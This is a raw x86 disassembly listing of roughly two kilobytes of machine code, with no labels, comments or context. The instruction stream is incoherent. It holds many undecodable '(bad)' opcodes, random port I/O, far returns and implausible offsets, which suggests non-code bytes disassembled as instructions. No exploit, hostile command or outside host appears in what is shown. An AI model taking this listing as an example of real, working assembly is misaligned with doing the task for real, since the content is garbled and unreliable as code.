  4301ac:	mov    ebp,0xff8bfffc
  4301b1:	dec    ebp
  4301b2:	mov    ch,0xf4
  4301b4:	call   DWORD PTR [ebx-0x1]
  4301b7:	mov    ebx,0x8005474
  4301bc:	call   DWORD PTR [ecx+0x8]
  4301bf:	pop    es
  4301c0:	jmp    0xb8:0xacb4533
  4301c7:	fwait
  4301c8:	mov    esi,DWORD PTR [edx-0xc]
  4301cb:	xor    cl,bl
  4301cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4301d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4301d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4301df:	xor    eax,DWORD PTR [eax]
  4301e1:	retf   
  4301e2:	retf   
  4301e3:	add    ecx,eax
  4301e5:	enter  0x894d,0x64
  4301e9:	dec    ebp
  4301ea:	sbb    ah,cl
  4301ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4301f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4301f8:	test   DWORD PTR [ebx],esi
  4301fa:	dec    ebx
  4301fc:	inc    DWORD PTR [ebx]
  4301fe:	inc    eax
  4301ff:	enter  0x8989,0x50
  430203:	(bad)  
  430204:	call   DWORD PTR [ebx+ecx*4-0x1]
  430208:	cld    
  430209:	dec    DWORD PTR [ebp-0xa90001]
  43020f:	push   edi
  430210:	mov    BYTE PTR [edx+0x1],ch
  430213:	and    al,BYTE PTR [eax]
  430215:	pop    ecx
  430216:	inc    ebp
  430217:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43021d:	push   0xffffff89
  43021f:	pop    ecx
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	dec    ebp
  430222:	add    BYTE PTR [ecx+0x45fc088b],cl
  430228:	jne    0x430274
  43022a:	lea    eax,[eax]
  43022c:	push   eax
  43022d:	(bad)  
  43022e:	dec    DWORD PTR [eax]
  430230:	mov    DWORD PTR [eax],eax
  430232:	test   al,0x0
  430234:	add    BYTE PTR [ebp-0x18],cl
  430237:	xor    ebp,DWORD PTR [ebx]
  430239:	add    eax,DWORD PTR [eax]
  43023b:	mov    eax,eax
  43023d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430244:	inc    ebp
  430245:	mov    DWORD PTR [ebx+0x459408],ecx
  43024b:	arpl   WORD PTR [ebx-0x372749b],cx
  430251:	sub    al,0x80
  430253:	inc    DWORD PTR [ecx]
  430255:	lea    eax,[eax]
  430257:	or     al,0x0
  430259:	inc    DWORD PTR [ecx-0x18]
  43025c:	mov    ecx,DWORD PTR [ebx]
  43025e:	cld    
  43025f:	add    BYTE PTR [ecx+0x75014d],cl
  430265:	(bad)  
  430266:	xchg   ebp,eax
  430267:	fdivr  st,st(7)
  430269:	inc    eax
  43026a:	inc    DWORD PTR [eax]
  43026c:	mov    ecx,DWORD PTR [ebp-0x4]
  43026f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430275:	add    BYTE PTR [edx],dl
  430277:	enter  0x4d90,0x0
  43027b:	mov    eax,DWORD PTR [eax]
  43027d:	hlt    
  43027e:	add    al,0xa5
  430280:	mov    al,0xff
  430282:	add    bh,bh
  430284:	add    BYTE PTR [ebx],dh
  430286:	inc    DWORD PTR [ebx]
  430288:	sbb    al,0x89
  43028a:	jne    0x430268
  43028c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430292:	mov    eax,DWORD PTR [ebp-0xff0048]
  430298:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43029f:	inc    DWORD PTR [ebp-0x75]
  4302a2:	fisttp QWORD PTR [esi+ebp*8]
  4302a5:	test   DWORD PTR [esi-0x1],esp
  4302a8:	inc    ebp
  4302a9:	(bad)  
  4302aa:	aas    
  4302ab:	inc    ebp
  4302ac:	(bad)  
  4302ad:	lea    edi,[esp+eiz*2-0x1]
  4302b1:	inc    edi
  4302b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4302b9:	mov    ebp,esp
  4302bb:	cld    
  4302bc:	loop   0x43024b
  4302be:	inc    ebp
  4302bf:	(bad)  
  4302c0:	out    dx,al
  4302c1:	(bad)  
  4302c2:	fisttp WORD PTR [eax+0x8801c7]
  4302c8:	jecxz  0x43030f
  4302ca:	in     al,dx
  4302cb:	inc    DWORD PTR [ebp-0x4]
  4302ce:	out    0x8d,eax
  4302d0:	aas    
  4302d1:	inc    edi
  4302d3:	jmp    FWORD PTR [eax-0x78]
  4302d6:	inc    DWORD PTR [ecx]
  4302d8:	mov    DWORD PTR [eax],0xc7043d
  4302de:	ins    BYTE PTR es:[edi],dx
  4302df:	test   edi,edi
  4302e1:	pandn  mm0,mm5
  4302e4:	aas    
  4302e5:	add    bh,al
  4302e7:	mov    esi,DWORD PTR [eax-0x4]
  4302ea:	inc    DWORD PTR [eax+0xdf01ee]
  4302f0:	(bad)  
  4302f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4302f5:	mov    ebp,ebx
  4302f7:	xchg   esp,eax
  4302f8:	fild   DWORD PTR [eax]
  4302fa:	(bad)  
  4302fb:	mov    edi,DWORD PTR [eax+0x3]
  4302fe:	(bad)  
  4302ff:	cmp    al,0xe7
  430301:	dec    ebp
  430302:	leave  
  430303:	mov    ebp,eax
  430305:	fsubr  DWORD PTR [edx]
  430307:	add    BYTE PTR [eax],al
  430309:	lea    ecx,[ebx-0x7f0003b4]
  43030f:	push   edx
  430310:	add    DWORD PTR [ebp+0x0],edx
  430313:	mov    esi,DWORD PTR [eax]
  430315:	mov    WORD PTR [edi],ss
  430317:	add    BYTE PTR [eax],al
  430319:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43031f:	add    ah,bh
  430321:	push   0x7d
  430323:	dec    DWORD PTR [ebx+0xd88c]
  430329:	push   edx
  43032a:	mov    edx,DWORD PTR [ecx-0x4]
  43032d:	call   DWORD PTR [eax+0x7d01fc]
  430333:	mov    esi,DWORD PTR [esi]
  430335:	cld    
  430336:	add    BYTE PTR [eax+0x560150],dl
  43033c:	test   DWORD PTR [ebp+0x75],eax
  43033f:	loop   0x4302cc
  430341:	jmp    0xe38b:0x947dc7fc
  430348:	fsub   st,st(7)
  43034a:	add    bh,al
  43034c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430352:	add    edi,edi
  430354:	add    bh,bh
  430356:	adc    al,0xed
  430358:	add    dh,ah
  43035a:	push   eax
  43035b:	inc    ebp
  43035c:	push   esi
  43035d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430363:	test   BYTE PTR [ebx],dh
  430365:	out    0x5,al
  430367:	shl    BYTE PTR [edx+0x45],0x0
  43036b:	jmp    0x43032e
  43036d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430374:	inc    esi
  430375:	jle    0x430377
  430377:	test   edi,eax
  430379:	(bad)  
  43037a:	call   0x130047e
  43037f:	out    0x75,al
  430381:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430387:	in     al,dx
  430388:	mov    esp,edx
  43038a:	mov    ah,0x85
  43038c:	add    bh,bh
  43038e:	call   0x1292d92
  430393:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43039a:	add    ebx,esp
  43039c:	add    ah,ch
  43039e:	xor    BYTE PTR [ebp-0xff0073],al
  4303a4:	mov    ebx,ebp
  4303a6:	cld    
  4303a7:	jle    0x430332
  4303a9:	add    DWORD PTR gs:[eax],eax
  4303ac:	add    BYTE PTR [eax+0x1],dl
  4303af:	inc    ebp
  4303b0:	inc    ebp
  4303b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4303b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4303bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4303c3:	inc    ebp
  4303c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4303ca:	inc    ebp
  4303cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4303d1:	mov    edi,edi
  4303d3:	mov    eax,0xe80800ff
  4303d8:	inc    ebp
  4303d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4303df:	add    al,0x1
  4303e1:	rol    BYTE PTR [eax],0x1e
  4303e4:	jne    0x43042b
  4303e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4303ec:	inc    DWORD PTR [ecx]
  4303ee:	call   0x882cf3
  4303f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4303f9:	call   0x432dff
  4303fe:	xor    bh,bh
  430400:	push   edi
  430401:	adc    BYTE PTR [ebx-0x74741bbb],al
  430407:	fsub   st,st(4)
  430409:	ret    
  43040a:	loopne 0x4303a7
  43040c:	xor    DWORD PTR [edx],0x31
  43040f:	cmp    edi,edi
  430411:	bswap  eax
  430413:	rol    BYTE PTR gs:[eax],0x5
  430417:	jmp    0x12e0561
  43041c:	mov    eax,DWORD PTR [ebp-0x4]
  43041f:	add    BYTE PTR [eax+0xff0100],bh
  430425:	cld    
  430426:	jne    0x4304a5
  430428:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43042e:	jb     0x430431
  430430:	add    BYTE PTR [eax],al
  430432:	push   eax
  430433:	fild   DWORD PTR [ebp+0x0]
  430436:	mov    edx,DWORD PTR [eax-0x68]
  430439:	inc    ebp
  43043a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430440:	or     bh,bh
  430442:	inc    ebp
  430443:	call   0x1272b47
  430448:	jge    0x430497
  43044a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430450:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430456:	fwait
  430457:	mov    eax,0x30132
  43045c:	lea    esi,[ebp+0x2c]
  43045f:	xor    edi,edi
  430461:	(bad)  
  430462:	call   0x1422dcf
  430467:	call   0x1372df7
  43046c:	jne    0x4303f9
  43046e:	xor    edi,esp
  430470:	add    eax,DWORD PTR [eax+0xc018d]
  430476:	push   DWORD PTR [eax]
  430478:	call   0xcc2dd4
  43047d:	enter  0x45ff,0xe0
  430481:	mov    ecx,DWORD PTR [ebp-0x28]
  430484:	xor    eax,DWORD PTR [eax]
  430486:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43048c:	(bad)  
  43048d:	xchg   ebp,eax
  43048e:	call   0x1420592
  430493:	mov    cl,0x45
  430495:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43049b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4304a2:	mov    edi,edi
  4304a4:	or     BYTE PTR [eax],cl
  4304a6:	inc    ebp
  4304a7:	test   DWORD PTR gs:[eax],eax
  4304aa:	je     0x4304f1
  4304ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4304b2:	xor    edx,DWORD PTR [eax-0x73]
  4304b5:	push   ebp
  4304b6:	or     BYTE PTR [ebp+0x21007572],al
  4304bc:	inc    ebp
  4304bd:	loopne 0x43044a
  4304bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4304c6:	int    0x0
  4304c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4304ce:	inc    ebp
  4304cf:	push   ebp
  4304d0:	cmp    ebp,eax
  4304d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4304d9:	cld    
  4304da:	fadd   QWORD PTR [eax+0x3b014d]
  4304e0:	jne    0x430512
  4304e2:	push   0xf8898557
  4304e7:	loopne 0x43055e
  4304e9:	inc    ebp
  4304ea:	lea    eax,[ebx+0x72e8e4cc]
  4304f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4304f6:	jmp    0x43052b
  4304f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4304fe:	xor    eax,edi
  430500:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43050a:	rcl    BYTE PTR [eax-0x40],1
  43050d:	inc    ebp
  43050e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430516:	inc    ebp
  430517:	xchg   ebp,eax
  430518:	ud0    ebp,DWORD PTR [ebx]
  43051b:	inc    DWORD PTR [eax]
  43051d:	daa    
  43051e:	jbe    0x430520
  430520:	mov    dl,BYTE PTR [eax-0x80]
  430523:	push   ebp
  430524:	pop    ds
  430525:	mov    ecx,DWORD PTR [esp+esi*8]
  430528:	inc    eax
  430529:	retf   
  43052a:	inc    ebp
  43052b:	iret   
  43052c:	jb     0x4304f6
  43052e:	mov    eax,DWORD PTR [edi]
  430530:	int3   
  430531:	inc    ebp
  430532:	inc    ebp
  430533:	add    DWORD PTR [ecx],esi
  430535:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43053c:	xor    dh,BYTE PTR [ebx]
  43053e:	pushf  
  43053f:	lea    ecx,[ecx+0x4d72d808]
  430545:	add    BYTE PTR [ebx],dh
  430547:	inc    ebp
  430548:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43054e:	xor    dl,BYTE PTR [edx]
  430550:	add    eax,DWORD PTR [ebp-0x77]
  430553:	mov    eax,esp
  430555:	fmul   QWORD PTR [ebp-0x3d]
  430558:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43055f:	mov    DWORD PTR [ebp-0x24],eax
  430562:	rol    DWORD PTR [ebp-0x64],1
  430565:	xor    eax,edi
  430567:	mov    ecx,0xff858db0
  43056c:	clc    
  43056d:	enter  0x4d45,0x3c
  430571:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430578:	test   esi,edi
  43057a:	clc    
  43057b:	inc    DWORD PTR [ebp+0x45]
  43057e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430586:	test   DWORD PTR [ecx],esi
  430588:	clc    
  430589:	pushf  
  43058a:	inc    ebp
  43058b:	(bad)  
  43058c:	cmp    ah,bh
  43058e:	pushf  
  43058f:	inc    ebp
  430590:	mov    edx,DWORD PTR [eax-0x24]
  430593:	add    BYTE PTR [ebp+0x0],dl
  430596:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43059c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4305a0:	add    al,dl
  4305a2:	jmp    0x1040772
  4305a7:	jb     0x4305f6
  4305a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4305af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4305b2:	xor    ecx,DWORD PTR [edi]
  4305b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4305b8:	(bad)  
  4305ba:	clc    
  4305bb:	int3   
  4305bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4305c3:	push   cs
  4305c4:	xor    ecx,eax
  4305c6:	xor    esp,ecx
  4305c8:	add    ebp,DWORD PTR [eax]
  4305ca:	add    esi,DWORD PTR [eax]
  4305cc:	(bad)  
  4305ce:	retf   0x55cc
  4305d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4305d5:	(bad)  
  4305d6:	cli    
  4305d7:	fdiv   st(1),st
  4305d9:	test   DWORD PTR [eax+edi*8],ecx
  4305dc:	dec    ebp
  4305dd:	inc    ebp
  4305de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4305e4:	add    BYTE PTR [ebp+0x0],al
  4305e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4305ea:	mov    ecx,ebx
  4305ec:	clc    
  4305ed:	jne    0x4305ba
  4305ef:	mov    esi,0xd672d3
  4305f4:	into   
  4305f5:	into   
  4305f6:	scas   eax,DWORD PTR es:[edi]
  4305f7:	dec    ebp
  4305f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4305fe:	sub    ecx,esi
  430600:	cmp    ecx,DWORD PTR [ebp+0x77]
  430603:	(bad)  
  430604:	mov    edi,eax
  430606:	mov    al,0x85
  430608:	mov    eax,edi
  43060a:	add    BYTE PTR [ebp-0x75],al
  43060d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430614:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43061a:	(bad)  
  43061c:	retf   0x559c
  43061f:	(bad)  
  430620:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430627:	inc    ebp
  430628:	add    eax,0xeb9c4d3f
  43062d:	(bad)  
  43062e:	mov    ecx,eax
  430630:	lods   al,BYTE PTR ds:[esi]
  430631:	test   DWORD PTR [ebp-0x8],edx
  430634:	xor    ecx,DWORD PTR [ebp+0x33]
  430637:	mov    eax,DWORD PTR [ebx]
  430639:	lock add ecx,ebx
  43063c:	bswap  esi
  43063e:	retf   0x55d1
  430641:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430647:	jmp    0x430642
  430649:	add    BYTE PTR ds:0xebc44d8b,al
  43064f:	push   ebp
  430650:	mov    ebp,DWORD PTR [ebx]
  430652:	test   al,0x8b
  430654:	push   ebp
  430655:	clc    
  430656:	xor    ecx,ebx
  430658:	xor    ecx,esi
  43065a:	add    edx,ecx
  43065c:	add    eax,DWORD PTR [edx+0xca010f]
  430662:	push   ebp
  430663:	dec    ebp
  430664:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43066a:	stc    
  43066b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430671:	scas   eax,DWORD PTR es:[edi]
  430672:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430678:	xor    ebp,DWORD PTR [ebx]
  43067a:	xor    edi,DWORD PTR [ebx]
  43067c:	add    esi,DWORD PTR [edi+0x3]
  43067f:	mov    ecx,DWORD PTR [edi]
  430681:	clc    
  430682:	retf   0x55cb
  430685:	into   
  430686:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43068d:	mov    eax,0x3376554d
  430692:	mov    esi,DWORD PTR [ebx]
  430694:	enter  0x5503,0x3
  430698:	xor    ecx,DWORD PTR [edi]
  43069a:	xor    ecx,edx
  43069c:	add    edx,DWORD PTR [ebp+0x3]
  43069f:	mov    ecx,DWORD PTR [edi]
  4306a1:	lock retf 0x4dfa
  4306a5:	stc    
  4306a6:	mov    ecx,DWORD PTR [eax]
  4306a8:	or     BYTE PTR [ebp+0x4d],cl
  4306ab:	jmp    0x107073b
  4306b0:	dec    ebp
  4306b1:	dec    ebp
  4306b2:	(bad)  
  4306b3:	mov    esp,esp
  4306b5:	clc    
  4306b6:	test   ebx,ecx
  4306b8:	clc    
  4306b9:	ror    DWORD PTR [ebp-0x2a],cl
  4306bc:	mov    esi,ecx
  4306be:	in     al,dx
  4306bf:	scas   eax,DWORD PTR es:[edi]
  4306c0:	inc    ebp
  4306c1:	mov    esi,DWORD PTR [ebx]
  4306c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4306ca:	retf   
  4306cb:	ja     0x43069b
  4306cd:	mov    ebp,DWORD PTR [eax-0x48]
  4306d0:	dec    ebp
  4306d1:	xor    ecx,DWORD PTR [di+0x3]
  4306d5:	mov    ebp,eax
  4306d7:	clc    
  4306d8:	push   ebp
  4306d9:	retf   
  4306da:	mov    dl,bl
  4306dc:	adc    esi,edx
  4306de:	jb     0x4306ae
  4306e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4306e6:	in     al,dx
  4306e7:	jge    0x4306b4
  4306e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4306ec:	mov    esi,DWORD PTR [edi-0x24]
  4306ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4306f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4306fc:	mov    edx,ebx
  4306fe:	in     al,dx
  4306ff:	(bad)  
  430700:	ror    esi,cl
  430702:	push   ebp
  430703:	scas   eax,DWORD PTR es:[edi]
  430704:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43070a:	fwait
  43070b:	sub    esi,DWORD PTR [edx]
  43070d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430713:	lods   al,BYTE PTR ds:[esi]
  430714:	xor    esp,DWORD PTR [ebx]
  430716:	add    ecx,DWORD PTR [ebp-0x18]
  430719:	mov    edi,DWORD PTR [ebp-0x8]
  43071c:	mov    bl,cl
  43071e:	cmp    dl,bl
  430720:	jb     0x4306f0
  430722:	add    dh,dl
  430724:	dec    ebp
  430725:	scas   eax,DWORD PTR es:[edi]
  430726:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43072c:	shr    DWORD PTR [ebx],cl
  43072e:	into   
  43072f:	cmp    edx,esi
  430731:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430737:	dec    ebp
  430738:	dec    ebp
  430739:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43073f:	retf   
  430740:	xor    edx,esi
  430742:	add    ecx,esi
  430744:	imul   ecx,edx
  430747:	mov    DWORD PTR [ebp+0x8],edx
  43074a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43074d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430753:	add    esi,DWORD PTR [ebx]
  430755:	mov    ah,0x3
  430757:	inc    ebp
  430758:	rdtsc  
  43075a:	xlat   BYTE PTR ds:[ebx]
  43075b:	pushf  
  43075c:	jge    0x4306e7
  43075e:	xor    ebx,esp
  430760:	sub    eax,DWORD PTR [ebp-0x73]
  430763:	(bad)  
  430764:	cmp    al,al
  430766:	jb     0x4306ed
  430768:	add    al,bh
  43076a:	ror    DWORD PTR [ebp-0x7a],1
  43076d:	xor    edi,edi
  43076f:	add    edi,edi
  430771:	jmp    0x4307c0
  430773:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430779:	dec    ebp
  43077a:	into   
  43077b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430781:	fwait
  430782:	shl    DWORD PTR [edx],cl
  430784:	retf   0x5588
  430787:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43078d:	add    eax,DWORD PTR [eax]
  43078f:	call   0x8ace5ce1
  430794:	fcom   DWORD PTR [ecx]
  430796:	retf   
  430797:	jb     0x4307fe
  430799:	add    ch,cl
  43079b:	dec    ebp
  43079c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4307a2:	dec    ebp
  4307a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4307a9:	jge    0x430779
  4307ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4307b1:	add    cl,dh
  4307b3:	dec    ebp
  4307b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4307ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4307be:	add    ah,bl
  4307c0:	jge    0x43074e
  4307c2:	push   0xffffff9b
  4307c4:	push   0x8b3032
  4307c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4307cd:	xor    edi,edi
  4307cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4307d2:	inc    ebp
  4307d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4307d9:	dec    ebp
  4307da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4307e0:	jbe    0x43076d
  4307e2:	mov    esp,eax
  4307e4:	ror    bl,1
  4307e6:	enter  0x14ce,0xaf
  4307ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4307f0:	push   ebp
  4307f1:	retf   0x5540
  4307f4:	push   ebp
  4307f5:	mov    esi,DWORD PTR [edx-0x18]
  4307f8:	mov    edx,ebx
  4307fa:	cld    
  4307fb:	(bad)  
  4307fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430803:	sti    
  430804:	add    dh,cl
  430806:	push   0xffffff94
  430808:	call   FWORD PTR [ebx+0x3b5032d0]
  43080e:	mov    ecx,DWORD PTR [edi]
  430810:	enter  0x455e,0xff
  430814:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43081a:	xor    esi,DWORD PTR [ebx]
  43081c:	mov    DWORD PTR [ebx],0xcace0f9c
  430822:	aas    
  430823:	push   ebp
  430824:	inc    ebp
  430825:	xor    edx,esi
  430827:	add    edx,esi
  430829:	mov    eax,DWORD PTR [ebx]
  43082b:	(bad)  
  43082c:	jmp    0x4307ba
  43082e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430834:	rol    ah,1
  430836:	mov    esi,0xf133104d
  43083b:	mov    edx,0xff388d80
  430840:	mov    dh,0xd1
  430842:	cmp    edx,DWORD PTR [ebp+0xf]
  430845:	mov    eax,DWORD PTR [edx-0x28]
  430848:	add    BYTE PTR [ebp-0x75],bh
  43084b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430852:	fwait
  430853:	retf   0x8632
  430856:	cmp    ebp,0x8
  430859:	call   ebx
  43085b:	inc    ebp
  43085c:	inc    ebp
  43085d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430863:	mov    esi,DWORD PTR [ecx]
  430865:	int3   
  430866:	pushf  
  430867:	add    al,0xc7
  430869:	add    al,al
  43086b:	add    bl,al
  43086d:	(bad)  
  43086e:	clc    
  43086f:	int3   
  430870:	inc    ebp
  430871:	add    BYTE PTR [ecx],dh
  430873:	push   eax
  430874:	pushf  
  430875:	mov    edi,eax
  430877:	enter  0xc008,0x85
  43087b:	aas    
  43087c:	clc    
  43087d:	gs inc ebp
  43087f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430885:	push   ss
  430886:	xor    ecx,DWORD PTR [ebp+0x3]
  430889:	sub    edx,DWORD PTR [ecx-0x76]
  43088c:	dec    ebp
  43088d:	add    DWORD PTR [ebx+0x88d845],ecx
  430893:	mov    esi,DWORD PTR [ebx]
  430895:	or     BYTE PTR [ebx],al
  430897:	cmp    edx,DWORD PTR [ecx-0x34]
  43089a:	dec    ebp
  43089b:	out    dx,eax
  43089c:	xor    eax,DWORD PTR [ebp+0x3]
  43089f:	mov    edx,DWORD PTR [ecx-0x28]
  4308a2:	dec    ebp
  4308a3:	add    BYTE PTR [ebx],dh
  4308a5:	push   0x518003
  4308aa:	push   eax
  4308ab:	add    BYTE PTR [ebx-0x300748b],cl
  4308b1:	sbb    BYTE PTR [ebp+0x45],cl
  4308b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4308ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4308c0:	dec    ebp
  4308c1:	inc    ebp
  4308c2:	xor    edx,esi
  4308c4:	add    edx,esi
  4308c6:	push   ecx
  4308c7:	(bad)  
  4308c8:	dec    ebp
  4308c9:	mov    al,ds:0xc5d83dff
  4308ce:	retf   
  4308cf:	(bad)  
  4308d0:	into   
  4308d1:	sub    bh,bh
  4308d3:	dec    esp
  4308d4:	adc    al,0x9c
  4308d6:	inc    ebp
  4308d7:	push   ebp
  4308d8:	test   DWORD PTR [edi],ecx
  4308da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4308e1:	jmp    0xc9bc17f5
  4308e6:	add    cl,dl
  4308e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4308f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4308f8:	rol    BYTE PTR [eax],0x54
  4308fb:	clc    
  4308fc:	gs jb  0x430906
  4308ff:	mov    eax,DWORD PTR [ebp-0x30]
  430902:	xor    al,0x40
  430904:	sub    al,0xc7
  430906:	mov    al,ah
  430908:	add    DWORD PTR [ebp+0x4534f845],eax
  43090e:	sub    al,0x80
  430910:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430917:	mov    ch,0xff
  430919:	clc    
  43091a:	add    DWORD PTR [ebp+0x60],0x3d
  43091e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430925:	inc    ebp
  430926:	dec    DWORD PTR [ebx-0x3427f701]
  43092c:	test   esi,ecx
  43092e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430934:	push   eax
  430935:	add    DWORD PTR [ebp+0x0],eax
  430938:	dec    ebx
  43093a:	or     al,0xce
  43093c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430943:	into   
  430944:	add    BYTE PTR [ebx-0x34ff2000],cl
  43094a:	mov    esi,ecx
  43094c:	sar    bh,0x45
  43094f:	adc    al,0x8b
  430951:	clc    
  430952:	fadd   DWORD PTR [ebp+0x0]
  430955:	mov    ebp,DWORD PTR [edx+0x8]
  430958:	push   edi
  430959:	adc    BYTE PTR [eax+0x1],0x83
  43095d:	add    al,al
  43095f:	retf   
  430960:	mov    ecx,esi
  430962:	cld    
  430963:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430969:	into   
  43096a:	add    BYTE PTR [ebx+0x756ae000],cl
  430970:	jne    0x4309a5
  430972:	inc    DWORD PTR [ebx]
  430974:	rcl    BYTE PTR [ecx+0x50],1
  430977:	push   eax
  430978:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43097e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430985:	sar    bh,0x84
  430988:	or     BYTE PTR [ebx],al
  43098a:	push   eax
  43098b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430991:	pushf  
  430992:	xor    edi,eax
  430994:	pushf  
  430995:	mov    ah,0x89
  430997:	test   esp,ebp
  430999:	clc    
  43099a:	inc    ebp
  43099b:	inc    ebp
  43099c:	mov    DWORD PTR [eax+eax*8],esi
  43099f:	sub    al,0x32
  4309a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4309a8:	dec    ebp
  4309a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4309b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4309be:	shl    DWORD PTR [ebp-0x380064],1
  4309c4:	enter  0x858d,0x60
  4309c8:	clc    
  4309c9:	inc    DWORD PTR [ebp+0x50]
  4309cc:	cmp    al,0x75
  4309ce:	pushf  
  4309cf:	(bad)  
  4309d0:	(bad)  
  4309d1:	pop    esp
  4309d2:	lods   al,BYTE PTR ds:[esi]
  4309d3:	inc    DWORD PTR [ebp+0x4508f8ff]
